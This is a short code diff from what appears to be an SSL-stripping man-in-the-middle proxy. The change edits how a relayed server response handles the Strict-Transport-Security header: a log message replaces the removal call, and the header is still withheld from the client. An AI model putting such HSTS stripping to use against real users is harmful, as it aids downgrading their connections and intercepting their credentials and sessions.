@@ -111,7 +111,7 @@ class ServerConnection(HTTPClient):
         elif (key.lower() == 'set-cookie'):
             self.client.responseHeaders.addRawHeader(key, value)
         elif (key.lower() == 'strict-transport-security'):
-            self.client.responseHeaders.removeHeader(key)
+            logging.info("HSTS Header omitted")
         else:
             self.client.setHeader(key, value)
 
